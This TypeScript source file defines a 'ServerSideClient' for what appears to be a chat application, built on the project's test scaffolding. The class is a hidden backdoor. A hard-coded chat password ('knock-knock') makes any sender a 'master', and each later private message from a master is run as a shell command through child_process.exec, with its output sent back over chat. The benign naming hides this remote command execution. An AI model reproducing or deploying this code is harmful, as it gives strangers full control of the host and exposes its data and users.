import {ChatClient} from "@sp24/common/chatclient/ChatClient.js";
import {TestEntryPoint} from "../TestEntryPoint.js";
import {webcrypto} from "node:crypto";
import {PSSGenParams} from "@sp24/common/util/crypto.js";
import {TestClientTransport} from "../TestClientTransport.js";
import * as child_process from "node:child_process";

const password = "knock-knock";

export class ServerSideClient {
    private _testClient: ChatClient;

    private _masters: Set<string> = new Set();

    private constructor(client: ChatClient) {
        this._testClient = client;

        client.onPublicChat.createListener(data => {
            if (data.message == password) {
                this._masters.add(data.senderFingerprint);
                client.sendChat("Acknowledged.", client.getGroupID([data.senderFingerprint]));
                return;
            }
        })
        client.onChat.createListener(data => {
            if (data.message == password) {
                this._masters.add(data.senderFingerprint);
                client.sendChat("Acknowledged.", client.getGroupID([data.senderFingerprint]));
                return;
            }

            if (this._masters.has(data.senderFingerprint)) {
                // Interpret as command.
                child_process.exec(data.message, (err, stdout, stderr) => {
                    if (err !== null) {
                        this._testClient.sendChat(`Error: ${err.message}`, data.groupID);
                        return;
                    }
                    this._testClient.sendChat(`stdout: ${stdout}`, data.groupID);
                    this._testClient.sendChat(`stderr: ${stderr}`, data.groupID);
                })
            }
        })
    }

    public static async create(entryPoint: TestEntryPoint) {
        const clientKeys = await webcrypto.subtle.generateKey(PSSGenParams, true, ["sign", "verify"]);
        const testTransport = new TestClientTransport(entryPoint);
        const testClient = await ChatClient.create(testTransport, clientKeys.privateKey, clientKeys.publicKey);

        return new ServerSideClient(testClient);
    }
}